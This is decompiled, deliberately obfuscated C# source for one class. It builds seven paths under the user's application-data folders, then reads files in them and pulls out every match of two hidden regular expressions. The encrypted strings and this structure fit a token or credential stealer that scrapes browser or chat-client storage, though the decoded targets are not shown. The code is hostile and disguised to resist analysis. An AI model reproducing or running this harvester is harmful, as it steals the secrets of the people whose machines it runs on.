using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

internal class UnorderedNotGreaterThanSignaling
{
	private static List<string> TryCode = new List<string>();

	private static int int_0/* Not supported: data(00 00 00 00) */;

	private static int StripAfterObfuscation/* Not supported: data(02 00 00 00) */;

	private static int sourceIndex/* Not supported: data(EE 43 00 00) */;

	private static int Nop/* Not supported: data(01 00 00 00) */;

	private static int UnorderedNotGreaterThanOrEqualNonSignaling/* Not supported: data(0E 00 00 00) */;

	private static int OrderedNotEqualSignaling/* Not supported: data(1B 77 01 00) */;

	private static int Arg_NonZeroLowerBound/* Not supported: data(8C 28 00 00) */;

	private static int AddTicks/* Not supported: data(C6 70 FF FF) */;

	private static int Acquire/* Not supported: data(40 1B 00 00) */;

	private static int InternalGlobalizationHelper/* Not supported: data(A8 02 00 00) */;

	private unsafe static void Escaped()
	{
		char[] array = new char[1] { '\u0005' };
		int[] array2 = new int[6] { 1, 0, 14, 1914, -118066, -839 };
		string folderPath = System.Environment.GetFolderPath((System.Environment.SpecialFolder)Convert.ToInt32("32", sizeof(double)));
		string folderPath2 = System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData);
		List<string> tryCode = TryCode;
		string string_ = string.Concat(char.ToString('픇'), char.ToString('픟'), "픲픨" + "픸픴픩픿");
		object[] array3 = new object[Convert.ToInt32("100", 2) * 1];
		array3[0] = _003CModule_003E.Task_RunSynchronously_Continuation[5];
		char nop = (char)Nop;
		array3[(uint)nop] = 9696;
		array3[StripAfterObfuscation] = string.Concat(char.ToString((char)array2[2]), char.ToString((char)array2[3]), char.ToString('Ģ') + "\u0002\u0001\0\u0002");
		array3[3] = checked(-21 * Convert.ToInt32("fffffff2", 16));
		_003CModule_003E.TryFormatDecimal(ref string_, array3);
		tryCode.Add(folderPath + string_);
		List<string> tryCode2 = TryCode;
		string string_2 = string.Concat("䂄䂼", char.ToString('䂱') + "䂫䂻", "䂷䂪" + char.ToString('䂼') + "䂻䂹䂶䂹䂪䂡");
		int num = default(int);
		switch (90448 - Convert.ToInt32("10110000101010000", 2))
		{
		case 0:
			num = 6;
			break;
		}
		object[] array4 = new object[num];
		int num2 = _003CModule_003E.Deny[0];
		int num3 = ((((OrderedNotEqualSignaling > _003CModule_003E.Deny[31]) ? 1 : 0) != array2[1]) ? 175439 : 1139);
		array4[num2] = num3;
		array4[(nint)((Array)(object)"\u036d").LongLength] = 402;
		array4[70032 >> Convert.ToInt32("f", 16)] = string.Concat(char.ToString('Ů'), char.ToString((char)UnorderedNotGreaterThanOrEqualNonSignaling), char.ToString('\u000e') + char.ToString('\u0004') + "\0\u0003");
		array4[3] = false;
		array4[-463358 - Convert.ToInt32("37776166776", 8)] = 2979;
		array4[0 | Marshal.SizeOf(typeof(Observed))] = Arg_NonZeroLowerBound | 0x2513;
		_003CModule_003E.TryFormatDecimal(ref string_2, array4);
		tryCode2.Add(folderPath + string_2);
		List<string> tryCode3 = TryCode;
		string string_3 = string.Concat("솀솸", "솵솯", char.ToString('솿') + char.ToString('솳') + "솮솸솬솨솾");
		object[] array5 = new object[3];
		array5[Convert.ToInt32("0", 8)] = (byte)(array2[1] % 152901) != 0;
		array5[(nint)((Array)(object)"\u036b").LongLength] = Convert.ToInt32(char.ToString('3') + "68f", 16);
		array5[2] = checked(-303193 - Convert.ToInt32("11111111111110101101010001011010", 2));
		_003CModule_003E.TryFormatDecimal(ref string_3, array5);
		tryCode3.Add(folderPath + string_3);
		List<string> tryCode4 = TryCode;
		string string_4 = string.Concat(char.ToString('퍻') + char.ToString('퍻') + "퍨퍗", char.ToString('퍂') + "퍕퍆팇퍴", char.ToString('퍈') + "퍁퍓퍐퍆퍕" + "퍂퍻퍨퍗퍂퍕퍆팇퍴퍓퍆퍅퍋퍂");
		object[] array6 = new object[2];
		array6[Convert.ToInt32("0", 2)] = ~AddTicks;
		array6[sizeof(sbyte)] = sourceIndex;
		_003CModule_003E.TryFormatDecimal(ref string_4, array6);
		tryCode4.Add(folderPath + string_4);
		List<string> tryCode5 = TryCode;
		string string_5 = string.Concat(char.ToString('\uee76') + char.ToString('\uee6d') + "\uee45\uee45\uee4d\uee46\uee4f\uee76", char.ToString('\uee69') + char.ToString('\uee42') + "\uee58\uee45\uee47", "\uee4f\uee76\uee7f\uee59\uee4f\uee58" + "\uee0a\uee6e\uee4b\uee5e\uee4b\uee76\uee6e\uee4f\uee4c\uee4b\uee5f\uee46\uee5e");
		object[] array7 = new object[6];
		array7[Convert.ToInt32("0", 8)] = string.Concat("ʃ\u0318", char.ToString('y') + "\u0011\u0003\u0004");
		array7[Marshal.SizeOf(typeof(StackCrawlMarkHandle))] = char.ToString('\u0cb4') + char.ToString('\u1c4c') + "\u1059\u1af8";
		array7[2] = 'ʉ';
		array7[3] = Convert.ToInt32(char.ToString('8') + char.ToString('7') + "4f", Convert.ToInt32("10000", 2));
		array7[array2[4] - _003CModule_003E.Task_RunSynchronously_Continuation[20]] = checked(array2[5] * -3);
		array7[701 >> Convert.ToInt32("7", 16)] = false;
		_003CModule_003E.TryFormatDecimal(ref string_5, array7);
		tryCode5.Add(folderPath2 + string_5);
		List<string> tryCode6 = TryCode;
		string string_6 = string.Concat(char.ToString('㌵'), "㌫㌛㌈㌟㌌㌺㌆㌏㌝㌞㌈㌛㌌㌵" + "㌫㌛㌈㌟㌌㍄㌫㌛㌆㌞㌚㌌㌛㌵㌼㌚㌌㌛㍉㌭㌈㌝㌈㌵㌭㌌㌏㌈㌜㌅㌝");
		object[] array8 = new object[(uint)array[0]];
		array8[0 * _003CModule_003E.Deny[32]] = checked(_003CModule_003E.IsRunning[24] * 4);
		char c = (char)array2[0];
		array8[(int)c] = string.Concat("ķT", char.ToString('\0') + "\u0001\u0003\u0005");
		array8[_003CModule_003E.Deny[Convert.ToInt32("2", 16)]] = 'ఘ';
		array8[3] = _003CModule_003E.Task_RunSynchronously_Continuation[6];
		array8[Convert.ToInt32("0", 2) | 4] = (char)Convert.ToInt32(char.ToString('1') + char.ToString('2') + "ec", 16);
		_003CModule_003E.TryFormatDecimal(ref string_6, array8);
		tryCode6.Add(folderPath2 + string_6);
		List<string> tryCode7 = TryCode;
		string string_7 = string.Concat(char.ToString('핾') + "핻핃핌핆핇핚핾핻핃핌", "핆핇핚" + "할핐핍핕핑핇핐핾핷핑핇핐픂핦핃핖핃핾핦핇필핃핗핎핖");
		object[] array9 = new object[4];
		array9[int_0] = (byte)(~Convert.ToInt32("37777777777", 8)) != 0;
		array9[array2[0]] = 0x36717 ^ Convert.ToInt32("110110110011011000", 2);
		array9[2] = 1956;
		char c2 = (char)Convert.ToInt32("3", 8);
		array9[(int)c2] = '솯';
		_003CModule_003E.TryFormatDecimal(ref string_7, array9);
		tryCode7.Add(folderPath2 + string_7);
	}

	public static List<string> SourceInterface()
	{
		char[] array = new char[1] { 'ⰼ' };
		int[] array2 = new int[1] { 1 };
		Escaped();
		List<string> list = new List<string>();
		foreach (string item in TryCode)
		{
			if (!Directory.Exists(item))
			{
				continue;
			}
			string string_ = string.Concat(char.ToString('䖜') + "䖌䖯䖣", "䖡䖬", "䗠䖓䖴䖯䖲䖡" + "䖧䖥䖜䖬䖥䖶䖥䖬䖤䖢");
			object[] array3 = new object[(nint)((Array)(object)(char.ToString('\u0352') + char.ToString('\u0318') + "\u034d.\u0347")).LongLength];
			array3[(nint)((Array)(object)string.Empty).LongLength | 0] = false;
			array3[Convert.ToInt32("15771250316", 8) / 1877299406] = (char)(_003CModule_003E.Deny[33] - Marshal.SizeOf(typeof(DS)));
			array3[2] = Convert.ToInt32(char.ToString('1') + "25", 8);
			int num = Convert.ToInt32("11", 2);
			array3[num] = _003CModule_003E.Deny[9];
			array3[(nint)((Array)(object)(char.ToString('\u034f') + char.ToString('\u036e') + ".\u0329")).LongLength] = string.Concat(char.ToString('ᖧ'), char.ToString('ᒇ'), char.ToString('۴') + "ԡଔ");
			_003CModule_003E.TryFormatDecimal(ref string_, array3);
			string path = item + string_;
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			string string_2 = string.Concat(char.ToString('嘝'), char.ToString('嘙') + "噛噓噕");
			object[] array4 = new object[4];
			array4[0 % Convert.ToInt32("11111111111101000100010000111011", 2)] = Convert.ToInt32("10" + "010000010010", Convert.ToInt32("2", 8));
			array4[1] = 543;
			array4[1 << Convert.ToInt32("1", 2)] = 1118;
			array4[3] = string.Concat(char.ToString('\u0f72'), char.ToString((char)Acquire), char.ToString('É') + char.ToString('\f') + "\t\t\u000f");
			_003CModule_003E.TryFormatDecimal(ref string_2, array4);
			FileInfo[] files = directoryInfo.GetFiles(string_2);
			for (int i = int_0 * -821957; i < files.Length; i += Convert.ToInt32("1", 2))
			{
				FileInfo fileInfo = files[i];
				string input = fileInfo.OpenText().ReadToEnd();
				string string_3 = string.Concat(char.ToString('捗') + "捐捻挡捑捷", "挾挸", char.ToString('捱') + char.ToString('捐') + "挢捗捐捻挡捑捷挺捱捐挢捗捐捻挡捑捷挾挻捱");
				object[] array5 = new object[_003CModule_003E.Deny[StripAfterObfuscation]];
				array5[Convert.ToInt32("0", 16)] = checked(Convert.ToInt32("11111111111111001111100110110100", 2) + 212252);
				int nop = Nop;
				array5[nop] = (int)array[0];
				_003CModule_003E.TryFormatDecimal(ref string_3, array5);
				foreach (Match item2 in Regex.Matches(input, string_3))
				{
					list.Add(item2.Value);
				}
				string string_4 = string.Concat("⨆⨍", char.ToString((char)Convert.ToInt32("2a0a", 16)), "⨷⩅" + "⨰⨷" + "⨜⩆⨶⨐⩓⩟⨖");
				object[] array6 = new object[2];
				array6[0] = Convert.ToInt32(char.ToString('2') + char.ToString('3') + "173", Convert.ToInt32("8", 16));
				array6[array2[0]] = char.ToString((char)InternalGlobalizationHelper) + char.ToString((char)Marshal.SizeOf(typeof(WaitAsync))) + "H\u0014";
				_003CModule_003E.TryFormatDecimal(ref string_4, array6);
				foreach (Match item3 in Regex.Matches(input, string_4))
				{
					list.Add(item3.Value);
				}
			}
		}
		return list;
	}
}
